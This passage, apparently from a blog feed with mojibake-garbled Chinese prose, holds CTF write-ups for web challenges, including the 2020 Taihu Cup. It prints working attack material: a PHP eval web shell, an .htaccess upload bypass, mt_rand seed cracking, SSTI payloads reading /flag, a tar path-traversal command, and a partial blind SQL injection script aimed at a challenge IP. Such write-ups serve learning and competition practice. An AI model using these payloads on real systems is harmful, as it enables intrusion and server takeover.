flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å±‚çš„md5ç”¨æ•°ç»„ç»•è¿‡ï¼Œ<code>?gg[]=1&amp;id[]=2</code>ï¼Œç¬¬äºŒå±‚passwdæ˜¯1234567aã€‚</p>
<h3 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h3><p>æ”¹<code>Content-Type: image/png</code>ï¼Œç„¶åä¼ ä¸ª<code>.hatccess</code>ï¼Œå†…å®¹ä¸ºï¼š</p>
<p>SetHandler application/x-httpd-php</p>
<p>å†ä¼ ä¸ªå›¾ç‰‡é©¬è¿‡å»<code>1.jpg</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥å³å¯</p>
<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>ä½¿ç”¨dirsearch</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd Documents/dirsearch</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -u <span class="string">&quot;url&quot;</span> -e *</span><br></pre></td></tr></table></figure>

<p>æ‰«ç›®å½•æ‰«åˆ°<a href="http://www.zip/">www.zip</a></p>
<p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶<span class="number">3</span>ç§’åè¿”å›ç™»å½•ç•Œé¢</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        echo <span class="string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        echo <span class="string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// genarate public_key</span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crisp<span class="string">r&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>

<p>éšæœºæ•°ç§å­é—®é¢˜ï¼Œç”¨è„šæœ¬å°†å…¬é’¥æ•´ç†æˆphp_mt_randçš„æ ¼å¼ï¼Œè„šæœ¬å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">$str = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span>;</span><br><span class="line">$randStr = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">$pos = strpos($randStr,$str[$i]);</span><br><span class="line">echo $pos.<span class="string">&quot; &quot;</span>.$pos.<span class="string">&quot; &quot;</span>.<span class="string">&quot;0 &quot;</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>è¿˜åŸæˆç§å­ä¸ºï¼š1775196155</p>
<p>æ¥ä¸‹æ¥è¿˜åŸå¯†é’¥å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        echo mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>).<span class="string">&quot;---&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">echo public_key();</span><br><span class="line">echo private_key();</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›login.html</p>
<p>è¾“å…¥ä¸‡èƒ½å¯†ç å’Œå¯†é’¥å’Œç”¨æˆ·åcrisprå³å¯ã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>å¤ªæ¹–æ¯ 2020</title>
    <url>/2020/11/14/%E5%A4%AA%E6%B9%96%E6%9D%AF/</url>
    <content><![CDATA[<p>å¤ç›˜ä¸€ä¸‹ä¸ä¹…å‰çš„å¤ªæ¹–æ¯çš„web&amp;misc<a id="more"></a></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="checkInGame"><a href="#checkInGame" class="headerlink" title="checkInGame"></a>checkInGame</h3><p>è¿›å»ä¹‹åæ˜¯ä¸€ä¸ªè¿è¿çœ‹çš„ç”»é¢ï¼Œå€’è®¡æ—¶40ç§’å®Œæˆå³å¯è·å¾—flag</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092621281.png" alt="image-20201108092621281"></p>
<p>è¯•äº†å‡ æ¬¡å‘ç°æ—¶é—´å®Œå…¨ä¸å¤Ÿï¼Œå½“ç„¶è¿è¿çœ‹é«˜æ‰‹é™¤å¤–ï¼Œæ­£ç¡®åšæ³•æ˜¯ï¼š</p>
<p>å®¡æŸ¥40è¿™ä¸ªå…ƒç´ æ‰“æ–­ç‚¹ï¼Œç„¶åæŠŠview.jsé‡Œé¢é‚£ä¸€å¥åˆ é™¤å³å¯åœæ­¢æ—¶é—´</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092959671.png" alt="image-20201108092959671"></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092913542.png" alt="image-20201108092913542"></p>
<p>æ…¢æ…¢è¿å®Œå³å¯å¾—åˆ°flag</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092601380.png" alt="image-20201108092601380"></p>
<h3 id="easyWeb"><a href="#easyWeb" class="headerlink" title="easyWeb"></a>easyWeb</h3><p>è¿›å…¥é¢˜ç›®ç•Œé¢å¦‚ä¸‹</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211736799.png" alt="image-20201107211736799"></p>
<p>éšä¾¿æŠ“ä¸ªåŒ…å‘ç°æ˜¯python</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211815382.png" alt="image-20201107211815382"></p>
<p>çŸ¥é“å¤§æ¦‚æ˜¯SSITï¼Œä½†æ˜¯è¿‡æ»¤äº†<code>&#123;</code>å’Œ<code>&#125;</code>ã€‚</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211926347.png" alt="image-20201107211926347"></p>
<p>åœ¨è¿™ä¸ªç½‘ç«™å¯»æ‰¾ç»•è¿‡çš„Unicodeå­—ç¬¦ï¼Œç½‘å€å¦‚ä¸‹ï¼š<a href="https://www.compart.com/en/unicode/U+FE38">ä¼ é€é—¨</a>ï¼Œç›´æ¥åœ¨ç½‘å€æœç´¢<code>&#123;</code>ï¼Œå°±ä¼šå‡ºç°ç±»ä¼¼çš„å­—ç¬¦ï¼Œå°±å¯ä»¥æ‰¾åˆ°<code>ï¸·</code>äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ï¸·ï¸·configï¸¸ï¸¸</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå›æ˜¾</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107233731092.png" alt="image-20201107233731092"></p>
<p>æ¥ä¸‹æ¥ç›´æ¥ç”¨å¸¸è§„çš„ssitçš„payloadæ‰“ä¸€ä¸‹å³å¯ï¼Œç„¶åå‘ç°è¿‡æ»¤äº†å¼•å·ï¼Œç”¨request.argsç»•ä¸€ä¸‹å³å¯ã€‚</p>
<p>payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%EF%B8%B7%EF%B8%B7().__class__.__bases__[0].__subclasses__()[375].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()%EF%B8%B8%EF%B8%B8</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108093620236.png" alt="image-20201108093620236"></p>
<p>é™¤äº†ä¸Šé¢çš„æ–¹æ³•ä¹‹å¤–ï¼Œè¿˜çœ‹åˆ°æœ‰å¸ˆå‚…ç”¨Unicodeå­—ç¬¦ç»•è¿‡çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ï½›	&amp;#65371;</span><br><span class="line">ï½	&amp;#65373;</span><br><span class="line">ï¼»	&amp;#65339;</span><br><span class="line">ï¼½	&amp;#65341;</span><br><span class="line">ï¼‡	&amp;#65287;</span><br><span class="line">ï¼‚	&amp;#65282;</span><br></pre></td></tr></table></figure>

<p>payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ï½›ï½›url_for.__globals__ï¼»ï¼‡__builtins__ï¼‡ï¼½ï¼»ï¼‡evalï¼‡ï¼½ï¼ˆï¼‡__import__ï¼ˆï¼‚osï¼‚ï¼‰.popenï¼ˆï¼‚cat &#x2F;flagï¼‚ï¼‰.readï¼ˆï¼‰ï¼‡ï¼‰ï½ï½ </span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201109164326501.png" alt="image-20201109164326501"></p>
<h3 id="CrossFire"><a href="#CrossFire" class="headerlink" title="CrossFire"></a>CrossFire</h3><p>é¢˜ç›®æœ‰ç»™å‡ºä¸¤ä¸ªhint</p>
<ul>
<li>å­˜åœ¨æ³¨å…¥ç‚¹</li>
<li>ç›®å½•ç©¿è¶Š</li>
</ul>
<p>é¦–å…ˆå‘ç°æœ‰ä¸€ä¸ªidå‚æ•°å¯ä»¥è¾“å…¥ï¼Œä½†æ˜¯è¾“å…¥1å’Œ0çš„å›æ˜¾ä¸ä¸€æ ·ã€‚</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221746512.png" alt="image-20201107221746512"></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221800783.png" alt="image-20201107221800783"></p>
<p>æµ‹è¯•ä¸€ä¸‹ifè¯­å¥è¡Œä¸è¡Œï¼Œå‘ç°å¯è¡Œï¼Œä»¥æ­¤ä¸ºåŸºç¡€å†™sqlç›²æ³¨è„šæœ¬ã€‚</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221952821.png" alt="image-20201107221952821"></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107222008777.png" alt="image-20201107222008777"></p>
<p>ç”¨ç¥–ä¼ çš„äºŒåˆ†æ³•è„šæœ¬è·‘ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥è·‘å‡ºæ•°æ®åº“</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107222255655.png" alt="image-20201107222255655"></p>
<p>ç„¶åå¯ä»¥ä½¿ç”¨<code>load_file</code>å‡½æ•°å»è¯»ä»–çš„ä¸€ä¸ªæºç ï¼Œè¯»å–index.phpã€‚</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107233227559.png" alt="image-20201107233227559"></p>
<p>è¿™é‡Œè¯»å–çš„æ—¶é—´æœ‰ç‚¹ç‚¹ä¹…ï¼Œæ…¢æ…¢ç­‰å°±å¥½äº†ï¼Œè¿™é‡Œè´´ä¸€ä¸‹index.phpçš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;&lt;/title&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span> /&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">   &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;filename:&lt;/label&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">$upload = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&quot;shuyu&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($upload);</span><br><span class="line">file_put_contents($upload.<span class="string">&#x27;/index.html&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">  $allow_type=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">  $fileext = substr(strrchr($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $filename=addslashes($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $sql=<span class="string">&quot;insert into img (filename) values (&#x27;<span class="subst">$filename</span>&#x27;)&quot;</span>;</span><br><span class="line">    $conn-&gt;query($sql);</span><br><span class="line">    $sql=<span class="string">&quot;select id from img where filename=&#x27;<span class="subst">$filename</span>&#x27;&quot;</span>;</span><br><span class="line">    $result=$conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $id=$row[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$upload.<span class="string">&#x27;/&#x27;</span>.$filename);</span><br><span class="line">      header(<span class="string">&quot;Location: index.php?id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  $id=addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">  $sql=<span class="string">&quot;select filename from img where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">  $result=$conn-&gt;query($sql);</span><br><span class="line">  <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">      $filename=$row[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $img=$upload.<span class="string">&#x27;/&#x27;</span>.$filename;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;<span class="subst">$img</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit1&#x27;</span>])) &#123;</span><br><span class="line">  $allow_type=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">  $fileext = substr(strrchr($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $filename=addslashes($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$upload.<span class="string">&#x27;/&#x27;</span>.$filename);</span><br><span class="line">    @exec(<span class="string">&quot;cd /tmp&amp;&amp;python3 /tar.py &quot;</span>.escapeshellarg(<span class="string">&#x27;/var/www/html/&#x27;</span>.$upload.<span class="string">&#x27;/&#x27;</span>.$filename));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">      background:url(./back.jpg)  no-repeat right <span class="number">-160</span>px  ;</span><br><span class="line">      background-size:<span class="number">90</span>%;</span><br><span class="line">      background-attachment:fixed;</span><br><span class="line">      background-color: rgba(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨index.phpé‡Œé¢å¯ä»¥å‘ç°åœ¨æ ¹ç›®å½•æœ‰<code>tar.py</code>ï¼Œç»§ç»­è¯»å–å‡ºæ¥ã€‚</p>
<p><code>tar.py</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tarfile</span><br><span class="line">import sys</span><br><span class="line">tar &#x3D; tarfile.open(sys.argv[1],&quot;r&quot;)</span><br><span class="line">tar.extractall()</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾è¿™æ˜¯ä¸ªè§£å‹æ–‡ä»¶çš„ä»£ç ï¼Œæ ¹æ®é¢˜ç›®çš„æç¤ºç›®å½•ç©¿è¶Šã€‚</p>
<p>åœ¨shell.phpé‡Œé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæˆ‘ä»¬åœ¨æœ¬åœ°å‹ç¼©ä¸€ä¸ªtaræ–‡ä»¶å¹¶åŠ ä¸Šç›®å½•ç©¿è¶Šçš„è·¯å¾„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf kawhi.tar ..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114113110315.png" alt="image-20201114113110315"></p>
<p>ç„¶åä¸Šä¼ ï¼Œåœ¨uploadç›®å½•å³å¯Getshellã€‚</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114113155483.png" alt="image-20201114113155483"></p>
<p>è¿ä¸Šèšå‰‘ï¼Œæœ€ååœ¨æ ¹ç›®å½•ä¸‹æ‰§è¡Œ/readflagå³å¯</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114112544006.png" alt="image-20201114112544006"></p>
<p>æœ€åè´´ä¸€ä¸‹è·‘æ–‡ä»¶å†…å®¹çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">pay</span>):</span></span><br><span class="line">	url = <span class="string">&quot;http://122.112.249.228:10080/index.php/?id=1+and+&quot;</span></span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30000</span>):</span><br><span class="line">		high = <span class="number">127</span></span><br><span class="line">		low = <span class="number">32</span></span><br><span class="line">		mid = (low + high) / <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span> high &gt; low:</span><br><span class="line">			payload = <span 